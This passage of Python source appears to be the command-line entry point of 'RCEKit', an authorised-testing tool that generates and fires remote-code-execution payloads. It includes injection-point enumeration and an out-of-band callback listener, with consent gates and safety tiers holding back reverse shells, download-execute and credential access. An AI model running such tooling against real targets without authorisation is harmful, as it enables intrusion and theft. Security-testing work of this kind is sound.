                             # argparse %-expands help text, so the delimiters
                             # are doubled here and appear singly in --help.
                             "share the <%%= %%> delimiters, so naming all three still costs one "
                             "request.")
    parser.add_argument("--sink-env", default=None, metavar="ENV",
                        help="(--methods) Which shell runs the injected command: "
                             f"auto (default) or one of {', '.join(SINK_ENVIRONMENTS)}. "
                             "The computed-value core, the separators and the break-out "
                             "contexts are all dialect-specific -- $((a+b)) and sleep are inert "
                             "text on cmd.exe, and PowerShell has no pipe break-out -- so a probe "
                             "written for the wrong shell cannot confirm. auto infers it from each "
                             "carrier; pin it when the corpus environment names the application "
                             "runtime rather than the OS (e.g. a PHP or Java app on Windows).")
    parser.add_argument("--sink-blind", action="store_true", default=None,
                        help="Sink returns no output: keep only out-of-band confirmable payloads (timing/OOB)")
    parser.add_argument("--sink-decodes", nargs="+", default=None,
                        help="Encodings the sink decodes before use (e.g. base64); those variants become valid and are generated")

    args = parser.parse_args(argv)

    if args.listen:
        import time
        tokens = load_token_manifest(args.correlate) if args.correlate else {}
        try:
            listener = OOBListener(tokens=tokens, answer_ip=args.listen_answer_ip,
                                   log_path=args.listen_log)
        except ValueError as exc:
            print(f"[!] {exc}")
            return 1
        listener.start_http(args.listen_http_port)
        dns_ok = listener.start_dns(args.listen_dns_port)
        print(f"[listen] OOB listener up — HTTP :{args.listen_http_port}"
              + (f", DNS :{args.listen_dns_port}" if dns_ok else " (DNS disabled)"))
        if tokens:
            print(f"[listen] correlating against {len(tokens)} tokens from {args.correlate}")
        else:
            print("[listen] no --correlate manifest; hits will be reported without payload mapping")
        print("[listen] waiting for callbacks — Ctrl+C to stop")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            unique = {h["token"] for h in listener.hits if h["token"]}
            correlated = {h["token"] for h in listener.hits if h["payload"]}
            print(f"\n[listen] stopped: {len(listener.hits)} callbacks, "
                  f"{len(unique)} unique tokens, {len(correlated)} correlated to a payload.")
        return 0

    # A target profile supplies defaults for the selection and filter options;
    # any explicit CLI flag overrides the matching profile field.
    profile: Dict[str, Any] = {}
    if args.target_profile:
        try:
            with open(args.target_profile, "r", encoding="utf-8") as profile_file:
                profile = validate_target_profile(json.load(profile_file))
        except Exception as exc:
            print(f"[!] Unable to load target profile {args.target_profile}: {exc}")
            return 1
        logger.info("Loaded target profile '%s' from %s", profile.get("name", "?"), args.target_profile)

    def from_profile(cli_value, key):
        return cli_value if cli_value is not None else profile.get(key)

    selected_environments = from_profile(args.environments, "environments")
    selected_contexts = from_profile(args.contexts, "contexts")
    selected_categories = from_profile(args.categories, "categories")
    selected_encodings = from_profile(args.encodings, "encodings")
    max_length = from_profile(args.max_length, "max_length")
    deny_chars = args.deny_chars
    if deny_chars is None and profile.get("deny_chars") is not None:
        deny_chars = "".join(profile["deny_chars"])

    # Sink-shape awareness: narrow generation to what this sink could execute.
    needs_separator = bool(from_profile(args.sink_needs_separator, "sink_needs_separator"))
    sink_raw = bool(from_profile(args.sink_raw, "sink_raw"))
    try:
        sink_shapes = parse_sink_shapes(from_profile(args.sink_shape, "sink_shape"))
        sink_env = parse_sink_env(from_profile(args.sink_env, "sink_env"))
        write_langs = parse_write_langs(from_profile(args.write_lang, "write_lang"))
        bridges = parse_bridges(from_profile(args.bridges, "bridges"))
        deser_formats = _parse_name_list(from_profile(args.deser_formats, "deser_formats"))
    except ValueError as exc:
        print(f"[!] {exc}")
        return 1
    # The observed endpoint, from either form. Resolved once, here, so the run
    # and the pre-flight plan describe the same request.
    observe_url = from_profile(args.observe_url, "observe_url")
    observe_method, observe_data, observe_headers = "GET", None, None
    if args.observe_request:
        if observe_url:
            print("[!] --observe-url and --observe-request name the same endpoint two ways; "
                  "pass one.")
            return 1
        try:
            with open(args.observe_request, "r", encoding="utf-8") as observe_fh:
                observe_raw = observe_fh.read()
            observe_url, observe_method, observe_data, observe_headers = build_plain_request(
                observe_raw, args.request_scheme)
        except (OSError, ValueError) as exc:
            print(f"[!] Unable to use --observe-request {args.observe_request}: {exc}")
            return 1
    eval_engines_raw = from_profile(args.eval_engines, "eval_engines")
    if isinstance(eval_engines_raw, str):
        eval_engines_raw = None if eval_engines_raw.strip() == "auto" else [
            part.strip() for part in eval_engines_raw.split(",") if part.strip()]
    eval_engines = tuple(eval_engines_raw) if eval_engines_raw else None
    if needs_separator and sink_shapes is None:
        # A profile that states the sink concatenates input mid-command has
        # already ruled the raw shape out: the value is never the whole command
        # there, so those probes are requests that cannot confirm.
        sink_shapes = tuple(rung for rung in SINK_SHAPE_RUNGS if rung != "raw")
    blind = bool(from_profile(args.sink_blind, "sink_blind"))
    sink_decodes = from_profile(args.sink_decodes, "sink_decodes") or []
    # Separators the shell probes break out with. A profile may carry them as a
    # list; the CLI takes a comma-separated string with \n for a newline.
    separators = from_profile(args.separators, "separators")
    if isinstance(separators, str):
        separators = [s.replace("\\n", "\n") for s in separators.split(",") if s]
    # A profile `request` block shapes the exported Burp/Nuclei requests.
    request_template = profile.get("request")

    template_path = Path(args.template_file) if args.template_file else None
    # Initialize generator
    generator = RCEKit(
        attacker_ip=args.attacker_ip,
        attacker_domain=args.attacker_domain,
        template_path=template_path,
    )
    generator.insecure = args.insecure

    # Never silent about a corpus that should have been there: someone who
    # thinks they are running an edited corpus must not discover only from the
    # results that they were running the built-in one. But an installed wheel
    # and a lone rcekit.py have no corpus directory at all -- the embedded copy
    # is the corpus -- so there is nothing to warn about and the notice would be
    # a permanent false alarm.
    if generator.uses_embedded_corpus() and not generator.standalone_layout():
        print(f"[i] Using the built-in payload corpus ({generator.template_path} not found). "
              "Pass --template-file to use your own.")

    if args.doctor:
        ok, report = generator.check_integrity()
        print("[doctor] RCEKit corpus integrity check")
        for line in report:
            print(line)
        print("[doctor] OK" if ok else "[doctor] PROBLEMS FOUND")
        return 0 if ok else 1

    if sink_decodes:
        # The sink decodes these, so the encoded form is a valid, executable
        # delivery here — add them to the encoding set that is in effect.
        current = selected_encodings if selected_encodings is not None else list(generator.default_encodings)
        additions = [e for e in sink_decodes if e in generator.encoding_methods]
        selected_encodings = list(dict.fromkeys(current + additions))

    mode = "detection" if args.detection_only else "exploit"

    # Refuse to run on a missing or empty corpus rather than silently emitting
    # zero payloads (e.g. the corpus file was quarantined by EDR after clone).
    corpus_ok, corpus_reason = generator.corpus_ready(mode)
    if not corpus_ok:
        print(f"[!] Payload corpus is not usable: {corpus_reason}")
        print("[!] Refusing to run with an incomplete corpus. Run "
              "'python rcekit.py --doctor' to diagnose, or pass --template-file with a valid corpus.")
        return 1

    if mode == "exploit" and not args.acknowledge_consent:
        print("[!] Exploitation mode requires explicit consent. Re-run with --acknowledge-consent after confirming authorization.")
        return 1

    watermark_token = None
    if mode == "exploit":
        # Always record an audit entry for accountability. Only embed the token
        # into the payloads themselves when explicitly requested, so the default
        # output stays clean and copy-pasteable for operational use.
        audit_token = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
        generator.log_exploitation_usage(audit_token, args)
        if args.watermark:
            watermark_token = audit_token

    max_safety = args.max_safety or ("safe" if mode == "detection" else "intrusive")
    include_blocking = args.include_blocking
    oob_domain = from_profile(args.oob_domain, "oob_domain")
    if args.output_format == "nuclei":
        # Nuclei templates rely on the time-based, OOB, and reflection oracles,
        # so pull in blocking/intrusive payloads and provide a placeholder OOB
        # host that the exporter rewrites to {{interactsh-url}}.
        include_blocking = True
        max_safety = "intrusive"
        if not oob_domain:
            oob_domain = "oob.interact.sh"

    if args.verify_chain:
        if not args.acknowledge_consent:
            print("[!] --verify-chain actively sends payloads to the target. Re-run with "
                  "--acknowledge-consent to confirm you are authorised to test it.")
            return 1
        with open(args.verify_chain, "r", encoding="utf-8") as chain_file:
            chain = json.load(chain_file)
        verify_max_safety = args.verify_active_risk or "safe"
        records = generator.generate_payload_records(
            selected_contexts=selected_contexts, selected_categories=selected_categories,
            selected_encodings=selected_encodings, selected_environments=selected_environments,
            mode=mode, watermark_token=watermark_token, max_safety=verify_max_safety,
            include_blocking=include_blocking, oob_domain=oob_domain,
        )
        # The chain delivers to a live target exactly as --verify-url does, so
        # it goes through the same sink-shape filters, the same destructive
        # hold-back and the same pre-flight plan. Anything less would make the
        # blast radius of a run depend on which delivery path it took.
        if deny_chars or max_length or needs_separator or blind:
            records = generator._filter_by_profile(
                records, deny_chars, max_length, needs_separator, blind)
        records, skipped_destructive = partition_destructive(
            records, args.verify_allow_destructive)
        verify_token = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
        generator.log_exploitation_usage(f"VERIFY-CHAIN:{verify_token} base={chain.get('base')}", args)
        plan_lines, records = build_verification_plan(
            records, "chain", chain.get("base", "?"),
            attacker_ip=generator.attacker_ip, attacker_domain=generator.attacker_domain,
            max_payloads=args.max_payloads)
        for line in plan_lines:
            print(line)
        if skipped_destructive:
            print(f"[plan] holding back {skipped_destructive} destructive payloads "
                  "(persistence/backdoors/etc.); pass --verify-allow-destructive to include them.")
        if verify_max_safety == "safe":
            print("[plan] low-impact (safe) payloads only; pass --verify-active-risk intrusive to also "
                  "fire reverse shells, download-execute, credential access, lateral movement and OOB.")
        print(f"[verify-chain] {chain.get('base')}  ({len(chain.get('steps', []))} steps, "
              f"{len(records)} payloads)  (authorised target)")
        results = generator.run_verification_chain(
            records, chain, delay=args.verify_delay, timeout=args.verify_timeout,
            max_payloads=args.max_payloads)
        by_verdict: Dict[str, int] = {}
        for result in results:
            by_verdict[result["verdict"]] = by_verdict.get(result["verdict"], 0) + 1
        executed = [r for r in results if r["verdict"] == "executed"]
        print(f"[verify-chain] sent {len(results)} unique payloads: " +
              ", ".join(f"{v}={c}" for v, c in sorted(by_verdict.items())))
        if executed:
            print(f"\n[verify-chain] EXECUTED ({len(executed)}):")
            for result in executed:
                print(f"  [{result['category']}] {result['payload']!r}   ({result['detail']})")
        else:
            print("\n[verify-chain] No execution proven.")
        return 0

    if args.verify_url or args.request_file:
        if not args.acknowledge_consent:
            print("[!] Verification actively sends payloads to the target. Re-run with "
                  "--acknowledge-consent to confirm you are authorised to test it.")
            return 1
        # Source the request from a raw capture (-r) or the --verify-* flags.
        # `injection_runs` is non-empty only when enumerating: one entry per
        # candidate point, each a fully built request in its own encoding.
        injection_runs: List[Tuple[Any, str, str, Optional[str], List[str], str]] = []
        if args.request_file:
            try:
                with open(args.request_file, "r", encoding="utf-8") as request_fh:
                    raw_request = request_fh.read()
            except OSError as exc:
                print(f"[!] Unable to read --request-file {args.request_file}: {exc}")
                return 1
            params = args.param or []
            auto_kinds = args.auto_params
            if not auto_kinds and any(p.lower() == "all" for p in params):
                auto_kinds = "all"
                params = [p for p in params if p.lower() != "all"]
            if auto_kinds and not args.methods:
                print("[!] Enumerating injection points needs --methods: the classic per-payload "
                      "oracle fires a whole corpus per point, which is not a budget anyone wants "
                      "multiplied by every candidate in the capture.")
                return 1
            if not auto_kinds and len(params) > 1:
                print("[!] -r takes a single -p, or '-p all' / --auto-params to enumerate.")
                return 1
            if auto_kinds:
                kinds = (None if auto_kinds.strip() == "all"
                         else tuple(k.strip() for k in auto_kinds.split(",") if k.strip()))
                unknown = [k for k in (kinds or ()) if k not in INJECTION_POINT_KINDS]
                if unknown:
                    print(f"[!] Unknown --auto-params kind(s): {', '.join(unknown)}. "
                          f"Choose from {', '.join(INJECTION_POINT_KINDS)}, or 'all'.")
                    return 1
                try:
                    parsed_request = parse_raw_request(raw_request)
                except ValueError as exc:
                    print(f"[!] Could not parse {args.request_file}: {exc}")
                    return 1
                points = enumerate_injection_points(
                    parsed_request, kinds=kinds,
                    include_path_segments=args.include_path_segments,
                    thorough=args.point_order == "thorough")
                if xml_body_is_signed(parsed_request.get("body") or ""):
                    # Said rather than left to the point count, because a
                    # signed envelope is the one case where finding nothing in
                    # the body is a statement about the capture and not about
                    # the target. Probing it anyway would spend the budget on
                    # digest failures that read exactly like a filter.
                    print("[verify] the captured body carries an XML signature; rewriting any "
                          "part of it breaks the digest, so no XML point was enumerated. Capture "
                          "the request before it is signed, or name a point outside the body.")
                if not points:
                    print("[!] No injection points found in the capture — nothing was tested. "
                          "Widen --auto-params, or add --include-path-segments.")
                    return 1
                dropped = max(0, len(points) - args.max_points)
                points = points[:args.max_points]
                for point in points:
                    try:
                        built = build_request_inputs(raw_request, scheme=args.request_scheme,
                                                     point=point)
                    except ValueError:
                        continue
                    injection_runs.append((point, ) + built)
                if not injection_runs:
                    print("[!] Every enumerated point failed to build a request — nothing was tested.")
                    return 1
                verify_url, method, verify_data, verify_headers, injection = injection_runs[0][1:]
                print(f"[verify] loaded request from {args.request_file}: enumerating "
                      f"{len(injection_runs)} injection point(s)"
                      + (f", {dropped} dropped by --max-points {args.max_points}"
                         if dropped else ""))
            else:
                try:
                    verify_url, method, verify_data, verify_headers, injection = build_request_inputs(
                        raw_request, param=(params[0] if params else None),
                        scheme=args.request_scheme)
                except ValueError as exc:
                    print(f"[!] Could not build a request from {args.request_file}: {exc}")
                    return 1
            method = args.verify_method or method
            if injection_runs:
                for point, url, _m, _d, _h, label in injection_runs:
                    print(f"[verify]   {label}")
            else:
                print(f"[verify] loaded request from {args.request_file}: {method} {verify_url} "
                      f"(injecting at {injection})")
            if args.request_scheme is None:
                resolved_scheme = verify_url.split("://", 1)[0]
                print(f"[verify] the capture records no scheme; inferred {resolved_scheme} "
                      "from the Host header — override with --request-scheme.")
                # A capture replayed over plain http puts whatever session it
                # carries on the wire. That is fine against a lab target and a
                # leak against a real one, and only the operator knows which,
                # so name the headers at risk instead of guessing for them.
                exposed = [name for name in
                           (h.partition(":")[0].strip() for h in verify_headers)
                           if name.lower() in RCEKit.SENSITIVE_HEADERS]
                if resolved_scheme == "http" and exposed:
                    print(f"[!] This request carries {', '.join(sorted(set(exposed)))} and will be "
                          "replayed over plain HTTP. If the target is HTTPS, pass --request-scheme "
                          "https (with --insecure for a self-signed or mismatched certificate).")
        else:
            verify_url = args.verify_url
            verify_data = args.verify_data
            verify_headers = args.verify_header
            if "FUZZ" not in verify_url and not (verify_data and "FUZZ" in verify_data) \
                    and not any("FUZZ" in h for h in (verify_headers or [])):
                print("[!] No FUZZ marker found in --verify-url/--verify-data/--verify-header; "
                      "add FUZZ where the payload should be injected.")
                return 1
            method = args.verify_method or ("POST" if verify_data else "GET")
        verify_token = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
        generator.log_exploitation_usage(f"VERIFY:{verify_token} url={verify_url}", args)
        # Safe by default: verification fires only low-impact proofs unless the
        # operator explicitly raises the ceiling. This holds back reverse shells,
        # download-execute, credential access, lateral movement, container
        # escape, cloud-metadata and OOB payloads (all classified 'intrusive'),
        # independent of --max-safety (which only governs file output).
        verify_max_safety = args.verify_active_risk or "safe"
        records = generator.generate_payload_records(
            selected_contexts=selected_contexts, selected_categories=selected_categories,
            selected_encodings=selected_encodings, selected_environments=selected_environments,
            mode=mode, watermark_token=watermark_token, max_safety=verify_max_safety,
            include_blocking=include_blocking, oob_domain=oob_domain,
        )
        if deny_chars or max_length or needs_separator or blind:
            records = generator._filter_by_profile(records, deny_chars, max_length, needs_separator, blind)
        # Never install backdoors / tamper with a live target unless asked.
        records, skipped_destructive = partition_destructive(
            records, args.verify_allow_destructive)
        # When capping, interleave so --max-payloads fires a balanced sample
        # across categories/environments instead of exhausting the first bucket.
        if args.max_payloads:
            records = list(generator._interleave(
                records, key=lambda r: (r.category, r.environment, r.sink)))
        # Show an execution plan before anything is fired.
        plan_lines, to_send = build_verification_plan(
            records, method, verify_url,
            attacker_ip=generator.attacker_ip, attacker_domain=generator.attacker_domain,
            max_payloads=args.max_payloads)
        for line in plan_lines:
            print(line)
        if skipped_destructive:
            print(f"[plan] holding back {skipped_destructive} destructive payloads "
                  "(persistence/backdoors/etc.); pass --verify-allow-destructive to include them.")
        if verify_max_safety == "safe":
            print("[plan] low-impact (safe) payloads only; pass --verify-active-risk intrusive to also "
                  "fire reverse shells, download-execute, credential access, lateral movement and OOB.")
        print(f"[verify] {method} {verify_url}  (authorised target)")
        # Opt-in, method-driven detection. Additive: without --methods the
        # classic per-payload oracle below runs exactly as before. `executed`
        # and the weaker tiers are reported separately and never merged.
        if args.methods:
            method_names = [m.strip() for m in args.methods.split(",") if m.strip()]
            unknown = [m for m in method_names if m not in DETECTION_METHODS]
            if unknown:
                print(f"[!] Unknown --methods: {', '.join(unknown)}. "
                      f"Available: {', '.join(sorted(DETECTION_METHODS))}.")
                return 1
            detection_config = {"webroot": args.webroot, "web_base_url": args.web_base_url,
                                "file_write_path": args.file_write_path,
                                "file_read_url": args.file_read_url,
                                # The declared target profile, reaching the probe
                                # ladder as well as the corpus. Resolved above,
                                # so --target-profile and the explicit flags
                                # arrive here already merged.
                                "deny_chars": deny_chars, "max_length": max_length,
                                "time_base": args.time_base, "evade": args.evade,
                                "sink_raw": sink_raw, "separators": separators,
                                "sink_shapes": sink_shapes, "sink_env": sink_env,
                                "write_read_url": args.write_url_template,
                                "write_langs": write_langs,
                                "observe_url": observe_url,
                                "observe_method": observe_method,
                                "observe_data": observe_data,
                                "observe_headers": observe_headers,
                                "bridges": bridges,
                                "deser_formats": deser_formats,
                                # The bridges honour the same safety ordering as
                                # every corpus payload, so a stateful bridge is
                                # held back by the same flag rather than riding
                                # in because a detection method built it.
                                "max_safety": verify_max_safety,
                                "observe_poll": args.observe_poll,
                                "observe_timeout": args.observe_timeout,
                                "eval_engines": eval_engines,
                                "confirm_depth": args.confirm_depth,
                                "probe_depth": args.probe_depth,
                                "contexts_explicit": bool(selected_contexts),
                                "oob_host": args.oob_host,
                                "oob_http_port": args.listen_http_port}
            # Read from the classes, not from a list kept here. Both of these
            # were hand-written tuples naming `oob` and `lookup`, so a new
            # method meant remembering to come back and add it -- and a probe
            # shape with nowhere to declare its rung was deleted instead.
            selected_methods = [DETECTION_METHODS[m] for m in method_names]
            # Configured instances, because whether a method calls back can
            # depend on its own flags -- `--deser-formats` decides it for
            # `deser`. Same shape as the `file` channel check below.
            configured_methods = [cls(generator, detection_config) for cls in selected_methods]
            for line in oob_address_strands(args, configured_methods):
                print(line)
            callback_methods = [m.name for m in selected_methods if m.needs_oob_host]
            if callback_methods and not args.oob_host:
                print("[!] --methods " + "/".join(callback_methods) + " makes the TARGET call back to a "
                      "listener, so it needs "
                      "--oob-host: an address the target can reach that arrives here (a domain "
                      "delegated to this host, or an IP on a routable interface — an IP serves oob "
                      "alone, since lookup has nowhere but a DNS label to carry its token).")
                return 1
            # Same gate the corpus payloads have always had. Detection methods
            # build their own probes and so bypass every corpus-level safety
            # filter, which was fine while every method was inert. The plan
            # printed 'low-impact (safe) payloads only ... pass
            # --verify-active-risk intrusive' and then fired OOB anyway: the run
            # contradicted itself, and the tier the operator chose did not mean
            # what it said.
            #
            # `gated_by_config` is the exception, and a narrow one: `file` and
            # `write` do nothing until the operator names a directory to write
            # into and a URL to read it back from, which says more than a rung
            # would -- and when that is missing, the run has something more
            # useful to say than which tier to raise.
            allowed_rung = SAFETY_ORDER.get(verify_max_safety, 0)
            for cls in selected_methods:
                if cls.gated_by_config:
                    continue
                if SAFETY_ORDER.get(cls.safety, 1) <= allowed_rung:
                    continue
                print(f"[!] --methods {cls.name} is a {cls.safety} technique, held back at the "
                      f"{verify_max_safety} tier — the same tier that holds back the corpus "
                      f"payloads of that kind. Pass --verify-active-risk {cls.safety} to allow "
                      "it.")
                return 1
            if args.oob_host and any(m.builds_callback_probes() and m.can_use_oob_host()
                                     for m in configured_methods):
                listener = OOBListener(answer_ip=args.listen_answer_ip, log_path=args.listen_log)
                # HTTP is `oob`'s channel, not `lookup`'s. A JNDI lookup reaches
                # this listener through DNS and nothing else, so a bound port
                # 8080 must not abort a run that never needed it.
                if OobCallback.name in callback_methods:
                    try:
                        listener.start_http(args.listen_http_port)
                    except OSError as exc:
                        print(f"[!] OOB listener could not bind HTTP port "
                              f"{args.listen_http_port}: {exc}")
                        return 1
                else:
                    try:
                        listener.start_http(args.listen_http_port)
                    except OSError as exc:
                        print(f"[detect] HTTP port {args.listen_http_port} is unavailable ({exc}); "
                              "continuing, because the selected methods call back over DNS.")
                dns_up = listener.start_dns(args.listen_dns_port)
                if LookupCallback.name in callback_methods and not dns_up:
                    # Every lookup probe resolves its callback host before doing
                    # anything else, and `lookup` has no second channel to fall
                    # back to the way `oob` has HTTP. With no DNS listener the
                    # probes go out, nothing can ever arrive, and every one of
                    # them is recorded `negative` -- "we reached the target and
                    # found nothing", about a channel that was never open. That
                    # is the misreport this tool exists to prevent, so the run
                    # stops instead.
                    print(f"[!] --methods lookup confirms only through DNS, and the listener could "
                          f"not take DNS port {args.listen_dns_port}. Every probe would be sent and "
                          "every callback lost, which would be reported as `negative` on a target "
                          "that may well be vulnerable. Free the port, or pass --listen-dns-port "
                          "with one this host can bind.")
                    return 1
                if LookupCallback.name in callback_methods and args.listen_dns_port != 53:
                    # Bound, but not where a resolver will look. A JNDI lookup
                    # goes through the system resolver, which asks port 53 --
                    # so a listener on any other port hears nothing unless the
                    # operator has delegated the domain to something that
                    # forwards here. Say so rather than let the run look clean.
                    print(f"[!] --methods lookup: the DNS listener is on :{args.listen_dns_port}, but a "
                          "JNDI lookup resolves through the system resolver, which asks :53. Unless "
                          f"{args.oob_host} is delegated to something that forwards here, no callback "
                          "can arrive and a `negative` would mean nothing. Use --listen-dns-port 53 "
                          "(needs privilege) or a delegated domain.")
                detection_config["oob_listener"] = listener
                print(f"[detect] OOB listener up on HTTP :{args.listen_http_port}"
                      f"{f', DNS :{args.listen_dns_port}' if dns_up else ' (DNS port unavailable)'}; "
                      f"probes call back to {args.oob_host}. The target will open outbound "
                      "connections.")
                for line in oob_channel_warnings(args, dns_up):
                    print(line)
            if "file" in method_names:
                file_channel = FileBased(generator, detection_config)._channel()
                if file_channel is None:
                    print("[!] --methods file writes a file to the target and fetches it back, so it "
                          "needs both halves: --file-write-path DIR and --file-read-url URL "
                          "(or the web-root alias --webroot DIR --web-base-url URL).")
                    return 1
                print(f"[detect] file-based method WRITES to {file_channel[0]} on the target and "
                      f"reads it back via {file_channel[1]}; each confirmed finding lists a "
                      "cleanup command.")
                # The read-back fetch carries the run's headers so an
                # authenticated download/export/LFI handler can be reached --
                # but only to the same origin. Say so when that costs the
                # credentials, because the symptom otherwise is a `negative` on
                # a target that executed the write perfectly.
                sensitive = [name for name in
                             (h.partition(":")[0].strip() for h in (verify_headers or []))
                             if name.lower() in RCEKit.SENSITIVE_HEADERS]
                if sensitive and not RCEKit.same_origin(verify_url, file_channel[1]):
                    print(f"[!] The read-back URL is a different origin from the target, so "
                          f"{', '.join(sorted(set(sensitive)))} will NOT be sent with it — "
                          "replaying a credential to another host would leak it. If that read-back "
                          "endpoint needs authentication, point it at the target's own origin.")
            if WriteThenExecute.name in method_names:
                writer = WriteThenExecute(generator, detection_config)
                if writer._channel() is None:
                    print("[!] --methods write stores a file on the target through your own "
                          "request and then fetches it back, so it needs --write-url-template "
                          "URL: the address that file is served at. RCEKit does not choose the "
                          "filename -- your request does -- so point it at exactly that file.")
                    return 1
                languages = writer._selected_languages()
                print(f"[detect] write method STORES a file on the target (written by your own "
                      f"request) and reads it back from {writer._channel()}; "
                      f"language(s): {', '.join(languages)}. Every finding lists a cleanup line.")
                print("[detect]   a computed value in the fetched file is EXECUTED -- proven "
                      "execution; the source coming back verbatim is FILE-WRITE -- an arbitrary "
                      "file write, also proven, and not RCE. The two are never merged.")
                if injection_runs:
                    # Enumeration multiplies a read-only probe by the candidate
                    # count; multiplying a *write* by it is a different kind of
                    # cost, and one the operator should have said yes to rather
                    # than discovered in the target's upload directory.
                    print(f"[!] --methods write is combined with injection-point enumeration, so "
                          f"the write is attempted at each of {len(injection_runs)} candidate "
                          "point(s). Narrow with -p/--max-points if that is more target state "
                          "than you intend to change.")
            if DeserSink.name in method_names:
                declared_deser = getattr(generator, "deser_probes", None) or {}
                chosen_deser = list(deser_formats or declared_deser)
                unknown = [name for name in chosen_deser if name not in declared_deser]
                if unknown:
                    print(f"[!] Unknown --deser-formats: {', '.join(unknown)}. "
                          f"Available: auto, {', '.join(sorted(declared_deser))}.")
                    return 1
                print(f"[detect] deserialization sink probes: {', '.join(chosen_deser)}. "
                      "This method NEVER reports RCE — it proves the endpoint parses "
                      "attacker-supplied object data, and reaching execution from there "
                      "depends on classpath gadgets RCEKit cannot see.")
                with_dns = [n for n in chosen_deser if declared_deser[n].get("dns")]
                if with_dns and not args.oob_host:
                    print(f"[!] {', '.join(with_dns)} also has a non-executing DNS gadget, which "
                          "needs --oob-host and a listener. Without it only the error-shape "
                          "oracle runs, and that reaches needs-review at best -- a parser "
                          "fingerprint, not a proven sink.")
            if bridges:
                declared = getattr(generator, "bridges", None) or {}
                if bridges == ("auto",):
                    chosen = sorted(declared)
                else:
                    unknown = [name for name in bridges if name not in declared]
                    if unknown:
                        print(f"[!] Unknown --bridges: {', '.join(unknown)}. "
                              f"Available: auto, {', '.join(sorted(declared))}.")
                        return 1
                    chosen = list(bridges)
                held = [name for name in chosen
                        if SAFETY_ORDER.get(declared[name].get("safety") or "intrusive", 1)
                        > SAFETY_ORDER.get(verify_max_safety, 1)]
                active = [name for name in chosen if name not in held]
                print(f"[detect] query-language bridges: {', '.join(active) or 'none active'} "
                      "-- the command probes are carried into the OS from inside a query "
                      "language, so reflected/time/oob prove execution through them.")
                for name in active:
                    bridge = declared[name]
                    needs = ", ".join(bridge.get("requires") or []) or "no stated prerequisite"
                    print(f"[detect]   {name}: {bridge.get('sink_env', 'unix')} shell, "
                          f"{bridge.get('safety', 'intrusive')} — needs {needs}")
                    if bridge.get("cleanup"):
                        print(f"[detect]     CREATES an object on the target; every finding "
                              "lists the statement that removes it.")
                if held:
                    # Name the tier each one actually needs. Calling an
                    # intrusive bridge stateful sends the operator to raise the
                    # ceiling further than the run requires, which is the wrong
                    # direction for a flag whose whole job is blast radius.
                    by_tier: Dict[str, List[str]] = {}
                    for name in held:
                        by_tier.setdefault(
                            declared[name].get("safety") or "intrusive", []).append(name)
                    for tier in sorted(by_tier, key=lambda t: SAFETY_ORDER.get(t, 1)):
                        why = ("they create an object on the target"
                               if tier == "stateful" else "they execute a command on the target")
                        print(f"[!] holding back {len(by_tier[tier])} {tier} bridge(s) "
                              f"({', '.join(by_tier[tier])}); pass --verify-active-risk {tier} "
                              f"to include them — {why}.")
                if not active:
                    print("[!] No bridge is active, so --bridges tested nothing. This is not a "
                          "negative result.")
            if observe_url:
                print(f"[detect] observing {observe_url} for second-order execution: polled every "
                      f"{args.observe_poll:g}s for up to {args.observe_timeout:g}s after the "
                      "probes are sent, differenced against a snapshot taken before any probe.")
                print("[detect]   only probes whose expected value is NOT in their own payload "
                      "are looked for there -- a stored payload rendered back would otherwise "
                      "confirm by reflection.")
            if set(method_names) & SHELL_PROBE_METHODS:
                # The ladder multiplies request count, so say which shapes are
                # about to be tried before trying them. An operator on a
                # monitored engagement needs to see the cost first, not infer it
                # from the traffic afterwards.
                #
                # Computed from the effective state, not from --sink-shape:
                # --separators, --contexts and --sink-raw each narrow the ladder,
                # so printing the raw flag would describe a run that is not the
                # one about to happen. This output is an audit or it is noise.
                effective = effective_sink_shapes(detection_config)
                narrowed = (sink_shapes is not None or sink_raw or separators
                            or sink_env or bool(selected_contexts))
                label = ", ".join(effective) if narrowed else "auto (full ladder)"
                print(f"[detect] sink shell: {sink_env or 'auto (per carrier)'}")
                print(f"[detect] sink shapes: {label}")
                for line in sink_shape_plan(effective):
                    print(line)
                if separators:
                    print("[detect]   (separators pinned by --separators: "
                          f"{', '.join(repr(s) for s in separators)})")
            if injection_runs:
                # Enumeration. Each candidate is its own request shape, so each
                # gets its own payload-free control -- differencing a header
                # probe against a query probe's control would compare two
                # different responses and prove nothing.
                #
                # Cheap methods first, per candidate. reflected and eval cost one
                # response each; time sleeps and oob waits for a callback.
                #
                # Once a candidate has proven execution, a method that would
                # only name that execution again buys nothing and is skipped.
                # A method whose tier is a *different property* is not skipped,
                # however thoroughly execution is proven: `lookup` reports a
                # lookup sink and `deser` a deserialization sink, each with its
                # own remediation, and both sat on the expensive side of a
                # hand-written list -- so a point that confirmed RCE was never
                # asked whether it was also one of those, and the answer was
                # never reported. Candidates that stay clean still get every
                # method either way.
                # Waves are ordered by cost and grouped by question. Cheap
                # execution methods first (one response each), then the
                # expensive ones, then each different property on its own.
                execution = [m for m in method_names
                             if detection_question(m) == "execution"]
                distinct: Dict[str, List[str]] = {}
                for name in method_names:
                    question = detection_question(name)
                    if question != "execution":
                        distinct.setdefault(question, []).append(name)
                waves = [("execution", w) for w in (
                    [m for m in execution if m in CHEAP_DETECTION_METHODS],
                    [m for m in execution if m not in CHEAP_DETECTION_METHODS],
                ) if w] + list(distinct.items())
                # Estimated per question and summed, because the budget is
                # granted per question. Counting the cap once while the loop
                # below hands it out `questions` times advertised 44 requests
                # for a run that sent 80 -- and this line exists for the
                # operator bounding a monitored engagement, who has nothing
                # else to go on before the traffic starts.
                per_point = sum(
                    generator.estimate_detection_probes(
                        to_send, [m for _q, w in waves for m in w if _q == question],
                        detection_config, max_payloads=args.max_payloads)
                    for question in dict.fromkeys(q for q, _ in waves))
                print(f"[detect] enumerating {len(injection_runs)} injection point(s) "
                      f"x {len(method_names)} method(s)")
                questions = len({q for q, _ in waves})
                capped = (f" (capped by --max-payloads {args.max_payloads} per question"
                          if args.max_payloads else "")
                capped += f", {questions} question(s) asked)" if args.max_payloads else ""
                print(f"[detect] cost: {len(injection_runs)} points x ~{per_point} probes{capped} "
                      f"= at least {len(injection_runs) * (per_point + len(waves))} requests "
                      f"(each point carries its own payload-free control)")
                results = []
                for point, point_url, point_method, point_data, point_headers, label in injection_runs:
                    point_results: List[Dict[str, Any]] = []
                    # Deliveries for this point alone, for the same reason the
